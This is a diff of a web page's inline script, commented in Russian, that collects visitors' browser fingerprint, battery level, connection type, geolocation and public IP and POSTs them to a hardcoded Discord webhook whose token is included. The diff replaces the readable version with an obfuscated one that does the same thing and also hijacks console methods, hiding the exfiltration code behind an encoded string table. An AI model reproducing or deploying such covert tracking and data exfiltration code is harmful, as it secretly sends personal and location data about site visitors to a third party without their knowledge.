@@ -32,65 +32,165 @@
     <noscript>Пожалуйста, включите JavaScript в вашем браузере для корректной работы сайта.</noscript>
     <div id="info"></div>
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1105111457869336596/SUe8UVJCwIKP6K8KqLhfPcxTxS7a2X47dPO3H9Kean6LpxLxZhnFrPxVtKcUm1zmdBd9" /// Тот кто нахуй тронет этот вебхук выебу, я его использую для получения статистики, ваш не нужный айпи никому не идет. 
-
-        let info = "<p>Имя браузера: " + navigator.appName + "</p>" +
-            "<p>Версия браузера: " + navigator.appVersion + "</p>" +
-            "<p>Кодовое имя браузера: " + navigator.appCodeName + "</p>" +
-            "<p>Пользовательский агент: " + navigator.userAgent + "</p>" +
-            "<p>Платформа: " + navigator.platform + "</p>" +
-            "<p>Язык: " + navigator.language + "</p>" +
-            "<p>Cookies включены: " + navigator.cookieEnabled + "</p>" +
-            "<p>Количество логических процессоров: " + navigator.hardwareConcurrency + "</p>" +
-            "<p>Устройство подключено к сети Интернет: " + navigator.onLine + "</p>" +
-            "<p>Настройка 'Не отслеживать': " + navigator.doNotTrack + "</p>";
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                info += "<p>Широта: " + position.coords.latitude + "</p>" +
-                    "<p>Долгота: " + position.coords.longitude + "</p>" +
-                  "<p>IP: " + data.ip + "</p>"
-                document.getElementById("info").innerHTML = info;
-
-            });
+      const _0x4df546 = _0xbcc0;
+function _0xbcc0(_0xa1fa6b, _0x423208) {
+    const _0x57a115 = _0x5bf2();
+    return _0xbcc0 = function (_0x16c9ce, _0x4b7443) {
+        _0x16c9ce = _0x16c9ce - 0x125;
+        let _0x5ea75f = _0x57a115[_0x16c9ce];
+        return _0x5ea75f;
+    }, _0xbcc0(_0xa1fa6b, _0x423208);
+}
+(function (_0x53161d, _0x48fc14) {
+    const _0x4254f3 = _0xbcc0, _0x341921 = _0x53161d();
+    while (!![]) {
+        try {
+            const _0x24ba82 = -parseInt(_0x4254f3(0x140)) / 0x1 * (parseInt(_0x4254f3(0x164)) / 0x2) + parseInt(_0x4254f3(0x154)) / 0x3 * (parseInt(_0x4254f3(0x163)) / 0x4) + parseInt(_0x4254f3(0x160)) / 0x5 + parseInt(_0x4254f3(0x151)) / 0x6 * (-parseInt(_0x4254f3(0x15c)) / 0x7) + parseInt(_0x4254f3(0x157)) / 0x8 * (-parseInt(_0x4254f3(0x166)) / 0x9) + parseInt(_0x4254f3(0x141)) / 0xa * (parseInt(_0x4254f3(0x14d)) / 0xb) + parseInt(_0x4254f3(0x152)) / 0xc;
+            if (_0x24ba82 === _0x48fc14)
+                break;
+            else
+                _0x341921['push'](_0x341921['shift']());
+        } catch (_0x598d8d) {
+            _0x341921['push'](_0x341921['shift']());
         }
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                info += "<p>Уровень заряда батареи: " + battery.level * 100 + "%" + "</p>";
-                document.getElementById("info").innerHTML = info;
-
-            });
+    }
+}(_0x5bf2, 0x6e8e6));
+const _0x4b7443 = (function () {
+        let _0x400b2b = !![];
+        return function (_0x29f7f9, _0x4bba14) {
+            const _0x2d7ede = _0x400b2b ? function () {
+                if (_0x4bba14) {
+                    const _0x4d9c34 = _0x4bba14['apply'](_0x29f7f9, arguments);
+                    return _0x4bba14 = null, _0x4d9c34;
+                }
+            } : function () {
+            };
+            return _0x400b2b = ![], _0x2d7ede;
+        };
+    }()), _0x16c9ce = _0x4b7443(this, function () {
+        const _0xcafdce = _0xbcc0;
+        let _0x336800;
+        try {
+            const _0xe6d35c = Function(_0xcafdce(0x128) + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
+            _0x336800 = _0xe6d35c();
+        } catch (_0x2544b4) {
+            _0x336800 = window;
         }
-
-        if (navigator.connection) {
-            info += "<p>Тип подключения к сети Интернет: " + navigator.connection.effectiveType + "</p>";
+        const _0x209aa8 = _0x336800[_0xcafdce(0x14f)] = _0x336800['console'] || {}, _0x2d89ee = [
+                _0xcafdce(0x13c),
+                _0xcafdce(0x134),
+                'info',
+                _0xcafdce(0x15f),
+                _0xcafdce(0x12b),
+                _0xcafdce(0x145),
+                _0xcafdce(0x12f)
+            ];
+        for (let _0x2add3b = 0x0; _0x2add3b < _0x2d89ee[_0xcafdce(0x147)]; _0x2add3b++) {
+            const _0x3d7983 = _0x4b7443[_0xcafdce(0x12d)][_0xcafdce(0x133)]['bind'](_0x4b7443), _0x4ec7bd = _0x2d89ee[_0x2add3b], _0x282751 = _0x209aa8[_0x4ec7bd] || _0x3d7983;
+            _0x3d7983[_0xcafdce(0x150)] = _0x4b7443[_0xcafdce(0x129)](_0x4b7443), _0x3d7983[_0xcafdce(0x12a)] = _0x282751[_0xcafdce(0x12a)][_0xcafdce(0x129)](_0x282751), _0x209aa8[_0x4ec7bd] = _0x3d7983;
         }
-
-        document.getElementById("info").innerHTML = info;
-
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById("info").innerHTML += "<p>IP-адрес: " + data.ip + "</p>";
-                sendMessage(info + data.ip);
-            });
-
-        document.addEventListener('keydown', event => {
-          if (event.ctrlKey && event.key === 'b') {
-              window.location.href = '/other-page.html';
-          }
-      });
-      function sendMessage(message) {
-          message = message.replace(/<[^>]*>/g, '\n');
-              fetch(webhookUrl, {
-                  method: 'POST',
-                  headers: {
-                      'Content-Type': 'application/json'
-                  },
-                  body: JSON.stringify({ content: message + '\n ----'})
-              });
-      }
+    });
+function _0x5bf2() {
+    const _0x22863a = [
+        'POST',
+        'latitude',
+        'error',
+        '3158890BzaKMI',
+        'stringify',
+        'hardwareConcurrency',
+        '5116FGCsTA',
+        '29534MCqGjM',
+        '<p>IP:\x20',
+        '1323LCnScZ',
+        '<p>Cookies\x20включены:\x20',
+        'level',
+        'getBattery',
+        'return\x20(function()\x20',
+        'bind',
+        'toString',
+        'exception',
+        '<p>Пользовательский\x20агент:\x20',
+        'constructor',
+        '\x0a\x20----',
+        'trace',
+        'coords',
+        'addEventListener',
+        'appCodeName',
+        'prototype',
+        'warn',
+        '<p>Платформа:\x20',
+        '<p>Устройство\x20подключено\x20к\x20сети\x20Интернет:\x20',
+        'https://discord.com/api/webhooks/1105111457869336596/SUe8UVJCwIKP6K8KqLhfPcxTxS7a2X47dPO3H9Kean6LpxLxZhnFrPxVtKcUm1zmdBd9',
+        'keydown',
+        'doNotTrack',
+        'geolocation',
+        '</p>',
+        'log',
+        '<p>Широта:\x20',
+        '<p>Уровень\x20заряда\x20батареи:\x20',
+        'longitude',
+        '17PjKtzl',
+        '10dIzlVn',
+        'json',
+        'appName',
+        '<p>Долгота:\x20',
+        'table',
+        'replace',
+        'length',
+        '<p>IP-адрес:\x20',
+        'platform',
+        'getCurrentPosition',
+        'onLine',
+        '<p>Кодовое\x20имя\x20браузера:\x20',
+        '2238654ilXLQZ',
+        'connection',
+        'console',
+        '__proto__',
+        '53460bDlszE',
+        '4289664DssAUj',
+        'then',
+        '303TomawK',
+        '<p>Настройка\x20\x27Не\x20отслеживать\x27:\x20',
+        '<p>Тип\x20подключения\x20к\x20сети\x20Интернет:\x20',
+        '20544AtLJwn',
+        'getElementById',
+        'location',
+        'info',
+        'innerHTML',
+        '189yMYmqA'
+    ];
+    _0x5bf2 = function () {
+        return _0x22863a;
+    };
+    return _0x5bf2();
+}
+_0x16c9ce();
+const webhookUrl = _0x4df546(0x137);
+let info = '<p>Имя\x20браузера:\x20' + navigator[_0x4df546(0x143)] + _0x4df546(0x13b) + '<p>Версия\x20браузера:\x20' + navigator['appVersion'] + _0x4df546(0x13b) + _0x4df546(0x14c) + navigator[_0x4df546(0x132)] + _0x4df546(0x13b) + _0x4df546(0x12c) + navigator['userAgent'] + _0x4df546(0x13b) + _0x4df546(0x135) + navigator[_0x4df546(0x149)] + _0x4df546(0x13b) + '<p>Язык:\x20' + navigator['language'] + _0x4df546(0x13b) + _0x4df546(0x125) + navigator['cookieEnabled'] + _0x4df546(0x13b) + '<p>Количество\x20логических\x20процессоров:\x20' + navigator[_0x4df546(0x162)] + _0x4df546(0x13b) + _0x4df546(0x136) + navigator[_0x4df546(0x14b)] + _0x4df546(0x13b) + _0x4df546(0x155) + navigator[_0x4df546(0x139)] + '</p>';
+navigator[_0x4df546(0x13a)] && navigator[_0x4df546(0x13a)][_0x4df546(0x14a)](_0x5d8e41 => {
+    const _0x450be5 = _0x4df546;
+    info += _0x450be5(0x13d) + _0x5d8e41[_0x450be5(0x130)][_0x450be5(0x15e)] + _0x450be5(0x13b) + _0x450be5(0x144) + _0x5d8e41[_0x450be5(0x130)][_0x450be5(0x13f)] + '</p>' + _0x450be5(0x165) + data['ip'] + '</p>', document[_0x450be5(0x158)](_0x450be5(0x15a))['innerHTML'] = info;
+});
+navigator['getBattery'] && navigator[_0x4df546(0x127)]()[_0x4df546(0x153)](_0x3223fb => {
+    const _0x41ba14 = _0x4df546;
+    info += _0x41ba14(0x13e) + _0x3223fb[_0x41ba14(0x126)] * 0x64 + '%' + _0x41ba14(0x13b), document[_0x41ba14(0x158)](_0x41ba14(0x15a))[_0x41ba14(0x15b)] = info;
+});
+navigator['connection'] && (info += _0x4df546(0x156) + navigator[_0x4df546(0x14e)]['effectiveType'] + _0x4df546(0x13b));
+document[_0x4df546(0x158)](_0x4df546(0x15a))[_0x4df546(0x15b)] = info, fetch('https://api.ipify.org?format=json')[_0x4df546(0x153)](_0x54d605 => _0x54d605[_0x4df546(0x142)]())['then'](_0x841039 => {
+    const _0x447cf8 = _0x4df546;
+    document[_0x447cf8(0x158)](_0x447cf8(0x15a))[_0x447cf8(0x15b)] += _0x447cf8(0x148) + _0x841039['ip'] + _0x447cf8(0x13b), sendMessage(info + _0x841039['ip']);
+}), document[_0x4df546(0x131)](_0x4df546(0x138), _0x30fa46 => {
+    const _0x28ec38 = _0x4df546;
+    _0x30fa46['ctrlKey'] && _0x30fa46['key'] === 'b' && (window[_0x28ec38(0x159)]['href'] = '/other-page.html');
+});
+function sendMessage(_0x6387ef) {
+    const _0x5c5186 = _0x4df546;
+    _0x6387ef = _0x6387ef[_0x5c5186(0x146)](/<[^>]*>/g, '\x0a'), fetch(webhookUrl, {
+        'method': _0x5c5186(0x15d),
+        'headers': { 'Content-Type': 'application/json' },
+        'body': JSON[_0x5c5186(0x161)]({ 'content': _0x6387ef + _0x5c5186(0x12e) })
+    });
+}
     </script>
 </body>
 </html>
